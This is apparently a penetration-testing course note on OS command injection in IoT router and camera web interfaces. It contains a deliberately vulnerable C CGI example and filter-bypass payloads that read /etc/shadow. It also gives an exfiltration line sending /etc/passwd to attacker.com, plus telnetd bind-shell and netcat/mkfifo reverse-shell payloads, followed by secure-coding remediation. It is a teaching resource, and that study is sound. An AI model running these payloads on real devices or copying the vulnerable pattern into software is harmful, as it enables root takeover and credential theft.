---
tags: [iot, pentesting, hardware, vapt]
difficulty: advanced
module: "49 - IoT Security"
topic: "49.10 Command Injection in IoT Web Interfaces"
---

# OS Command Injection in IoT Web Interfaces

## 1. Introduction

While IoT hardware hacking—interfacing with UART, dumping SPI flash, and glitching secure boot—receives significant attention due to its complexity, the most common, reliable, and easily exploitable vulnerabilities in IoT ecosystems are found in the software layer. Specifically, **OS Command Injection** within the device's local administrative web interface.

Almost all consumer and industrial IoT devices (routers, IP cameras, NAS drives, smart home hubs) feature a lightweight web server (e.g., `lighttpd`, `boa`, `uhttpd`) running a Common Gateway Interface (CGI) architecture. These web applications are designed to allow users to configure network settings, update firmware, and manage the device.

Because embedded development traditionally prioritized functionality and tight memory constraints over secure coding practices, user input supplied via web forms is frequently passed directly to lower-level system shells (`/bin/sh`, `/bin/bash`) without proper sanitization. This allows an attacker to execute arbitrary system commands with the privileges of the web server daemon—which, in embedded Linux, is almost always `root`.

## 2. The Root Cause in Embedded Systems

Command injection occurs when an application constructs a system command using unvalidated user input and executes it via functions like `system()`, `popen()`, `exec()`, or backticks in languages like C, PHP, Lua, or shell scripts.

### 2.1. The "Wrapper" Paradigm

IoT web interfaces are rarely monolithic applications. Instead, they act as front-end GUI wrappers around standard Linux command-line utilities.

**Example: Ping Diagnostics**
A router's web interface has a "Diagnostics" page where the user can enter an IP address to ping.
The backend C CGI binary takes the IP address from the HTTP POST parameter and constructs a string:
```c
// VULNERABLE C CODE EXAMPLE
void cgi_ping(char *user_provided_ip) {
    char command[256]; 
    sprintf(command, "ping -c 4 %s", user_provided_ip); 
    system(command);
}
```

If the user enters `8.8.8.8`, the system executes `ping -c 4 8.8.8.8`.
However, if the attacker enters `8.8.8.8; cat /etc/shadow`, the system executes:
`ping -c 4 8.8.8.8; cat /etc/shadow`
The shell executes the ping, finishes, and then executes the `cat` command, dumping the system's password hashes directly into the HTTP response.

## 3. Common Injection Contexts and Metacharacters

To successfully inject commands, the attacker must break out of the intended command structure. This is done using shell metacharacters.

**Primary Injection Operators:**
*   `;` (Semicolon): Executes multiple commands sequentially.
*   `&&` (Logical AND): Executes the second command only if the first succeeds (returns 0).
*   `||` (Logical OR): Executes the second command only if the first fails.
*   `|` (Pipe): Passes the output of the first command as the input to the second.
*   `$(command)` or `` `command` `` (Command Substitution): Executes the inner command and places its output into the outer command. Useful for injecting into parameters that are enclosed in quotes.
*   `\n` (Newline - `0x0A`): Often terminates the current command and starts a new one, bypassing some simple regex filters.

**High-Risk Target Areas in IoT:**
1.  **Network Diagnostics:** Ping, Traceroute, NSLookup (parameters: IP address, hostname).
2.  **Time/NTP Configuration:** NTP server addresses.
3.  **WIFI Configuration:** SSID, Pre-Shared Key (PSK). If the web app passes the SSID directly into a `hostapd` configuration script.
4.  **Hostname/Device Name Settings:**
5.  **Firmware Updates:** If the URL for a custom update server is passed to `wget` or `curl`.

## 4. Exploitation and Bypassing Filters

Developers often attempt to patch injection flaws using blacklists, which are notoriously easy to bypass in bash/sh environments.

### 4.1. Space Evasion

If the application filters the space character (` `), an attacker cannot easily pass arguments to their injected commands.
*   **Bypass:** Use the Internal Field Separator (`$IFS`) environment variable.
    *   Payload: `;cat$IFS/etc/shadow`
*   **Bypass:** Use input redirection.
    *   Payload: `;cat</etc/shadow`
*   **Bypass:** Use brace expansion.
    *   Payload: `;{cat,/etc/shadow}`

### 4.2. Keyword Blacklisting

If the application blacklists dangerous words like `nc`, `wget`, `cat`, or `telnetd`.
*   **Bypass:** String concatenation or escaping.
    *   Payload: `c\at /etc/shadow`
    *   Payload: `c"a"t /etc/shadow`
    *   Payload: `ca$@t /etc/shadow`
*   **Bypass:** Wildcards.
    *   Payload: `/bin/c?? /etc/sh*`

### 4.3. Blind Command Injection

In many cases, the web application executes the command but does not return the `stdout` or `stderr` in the HTTP response. The vulnerability is "blind."

1.  **Time-Based Exfiltration:** Inject sleep commands. If the HTTP response is delayed, the injection was successful.
    *   Payload: `;sleep 10;`
2.  **Out-of-Band (OOB) Exfiltration:** Force the device to make a network connection back to an attacker-controlled server.
    *   Payload: `;wget http://attacker.com/$(cat /etc/passwd | base64 | tr -d '\n');`
    *   *Note: Many IoT environments use BusyBox, which has stripped-down utilities. Standard `base64` might not be available.*

## 5. Post-Exploitation and Establishing a Shell

The immediate goal of command injection is to upgrade from executing single commands to obtaining a persistent interactive shell. Because IoT devices run stripped-down Linux environments (BusyBox), standard payload techniques often fail. Python, Perl, and Ruby are rarely installed.

**Technique 1: Telnetd Bind Shell**
BusyBox often includes a tiny telnet daemon. An attacker can use command injection to start it on a high port, binding it to `/bin/sh`.
*   Payload: `;telnetd -l /bin/sh -p 9999;`
*   The attacker then connects: `telnet <device_ip> 9999` and receives a root prompt.

**Technique 2: Netcat Reverse Shell**
If the device's BusyBox includes the `nc` (netcat) applet with the `-e` (execute) flag compiled in.
*   Payload: `;nc 192.168.1.100 4444 -e /bin/sh;`

**Technique 3: The Mknod/FIFO Reverse Shell**
If `nc` does not support `-e`, an attacker must use named pipes (FIFOs) to redirect standard input and output through the netcat connection.
*   Payload: `;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f;`

## 6. Architecture of an IoT Web Injection (ASCII Diagram)

```text
  [ Attacker ]
       |
       | 1. HTTP POST /cgi-bin/diag.cgi
       |    ip=8.8.8.8;telnetd -l /bin/sh -p 9999
       v
 +---------------------------------------------------+
 | IoT Device (e.g., Home Router)                    |
 |                                                   |
 |  +-----------------------+                        |
 |  | Web Server (uHTTPd)   |  (Runs as root)        |
 |  +-----------------------+                        |
 |            | 2. Passes POST variable              |
 |            v                                      |
 |  +-----------------------+                        |
 |  | diag.cgi (C Binary)   |                        |
 |  |                       |                        |
 |  | sprintf(cmd,          |                        |
 |  | "ping -c 4 %s", ip);  |                        |
 |  | system(cmd);          |                        |
 |  +-----------------------+                        |
 |            | 3. Executes command string           |
 |            v                                      |
 |  +---------------------------------------------+  |
 |  | OS Shell (/bin/sh)                          |  |
 |  |                                             |  |
 |  | $ ping -c 4 8.8.8.8  (Executes normally)    |  |
 |  | $ telnetd -l /bin/sh -p 9999 (Malicious)    |  |
 |  +---------------------------------------------+  |
 |            |                                      |
 |            v                                      |
 |  +-----------------------+                        |
 |  | Telnet Daemon         | <--- 4. Listens on     |
 |  | (Root Privileges)     |      Port 9999         |
 |  +-----------------------+                        |
 +---------------------------------------------------+
```

## 7. Remediation and Secure Coding

The only robust defense against command injection is to avoid calling external shell interpreters entirely.

1.  **Use Built-in APIs:** Instead of invoking the `ifconfig` binary via `system()`, use the native C/C++ networking libraries (e.g., `ioctl()` sockets) to configure network interfaces directly.
2.  **Avoid `system()` and `popen()`:** If an external program must be called, use `execve()`. `execve()` does not invoke a shell (`/bin/sh`); it passes the arguments directly to the program executable, treating all parameters as literal strings, rendering shell metacharacters harmless.

```c
// SECURE C CODE EXAMPLE USING execve()
void cgi_ping_secure(char *user_provided_ip) {
    pid_t pid = fork();
    if (pid == 0) {
        // We are in the child process
        char *args[] = {"/bin/ping", "-c", "4", user_provided_ip, NULL};
        execve(args[0], args, NULL);
        // If execve returns, an error occurred
        exit(1); 
    }
}
```

3.  **Strict Input Validation (Allowlisting):** If user input *must* be used, validate it against a strict allowlist regex. Do not rely on blacklisting shell characters.
4.  **Principle of Least Privilege:** Do not run the web server daemon as `root`. Run it as a low-privileged user (`www-data`). If certain administrative tasks require root, use `sudo` or SUID binaries tightly scoped to those specific, parameterized tasks.

## 8. Chaining Opportunities

*   **[[06 - Insecure Update Mechanisms]]:** Once a root shell is established via command injection, the attacker can trivially disable or subvert the firmware update mechanism.
*   **[[02 - Firmware Extraction and Analysis]]:** Command injection is the most common way to achieve software-based firmware extraction over the network.
*   **[[12 - Embedded Linux Privilege Escalation]]:** If the web server correctly runs as a low-privileged user, command injection must be chained with local kernel exploits or misconfigured SUID binaries to achieve root.

## 9. Related Notes

*   [[14 - Authentication Bypasses in IoT Web Apps]]
*   [[15 - Cross-Site Scripting (XSS) in Embedded Devices]]
